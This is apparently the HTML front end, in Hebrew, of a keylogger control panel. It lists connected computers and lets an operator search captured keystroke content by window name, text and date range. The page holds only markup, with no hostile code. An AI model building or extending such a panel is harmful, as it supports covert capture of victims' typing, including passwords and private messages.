<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>לוח בקרה - קילוגר</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<body>
    <div class="cyber-background"></div>
    
    <div class="container">
        <h1>לוח בקרה - קילוגר</h1>
        
        <!-- חיפוש גלובלי -->
        <div class="search-controls">
            <div class="search-inputs-container">
                <div class="search-row">
                    <div class="search-input-group">
                        <label>חיפוש חלון:</label>
                        <input type="text" id="window-filter" placeholder="הקלד חלון...">
                    </div>
                    <div class="search-input-group">
                        <label>חיפוש תוכן:</label>
                        <input type="text" id="content-filter" placeholder="הקלד תוכן...">
                    </div>
                </div>
                <button onclick="search()" class="search-button-full">
                    <i class="fas fa-search"></i> חפש
                </button>
            </div>
            <div class="date-range">
                <div class="date-input">
                    <label>מתאריך:</label>
                    <input type="datetime-local" id="start-date">
                    <i class="fas fa-calendar calendar-trigger"></i>
                </div>
                <div class="date-input">
                    <label>עד תאריך:</label>
                    <input type="datetime-local" id="end-date">
                    <i class="fas fa-calendar calendar-trigger"></i>
                </div>
            </div>
        </div>

        <!-- רשימת מחשבים -->
        <h2>מחשבים מחוברים</h2>
        <div id="computer-list"></div>
    </div>

    <!-- פופ-אפ פרטי מחשב -->
    <div id="computer-details-popup" class="popup">
        <div class="popup-content">
            <span class="close" onclick="closeComputerDetails()">&times;</span>
            <h2 id="computer-name-title"></h2>
            <div class="computer-info"></div>
            
            <!-- חיפוש בתוך מחשב ספציפי -->
            <div class="search-controls">
                <div class="search-inputs-container">
                    <div class="search-row">
                        <div class="search-input-group">
                            <label>חיפוש חלון:</label>
                            <input type="text" id="computer-window-filter" placeholder="הקלד שם חלון...">
                        </div>
                        <div class="search-input-group">
                            <label>חיפוש תוכן:</label>
                            <input type="text" id="computer-content-filter" placeholder="הקלד תוכן...">
                        </div>
                    </div>
                    <button onclick="searchComputerData()" class="search-button-full">
                        <i class="fas fa-search"></i> חפש
                    </button>
                </div>
                <div class="date-range">
                    <div class="date-input">
                        <label>מתאריך:</label>
                        <input type="datetime-local" id="computer-start-date">
                        <i class="fas fa-calendar calendar-trigger"></i>
                    </div>
                    <div class="date-input">
                        <label>עד תאריך:</label>
                        <input type="datetime-local" id="computer-end-date">
                        <i class="fas fa-calendar calendar-trigger"></i>
                    </div>
                    <button onclick="searchComputerData()">חפש</button>
                </div>
            </div>
            
            <div id="computer-search-results" class="results-container"></div>
        </div>
    </div>

    <!-- פופ-אפ תוצאות חיפוש -->
    <div id="search-results-popup" class="popup">
        <div class="popup-content">
            <span class="close" onclick="closeSearchResults()">&times;</span>
            <h2>תוצאות חיפוש</h2>
            <div class="results-container" id="search-results"></div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
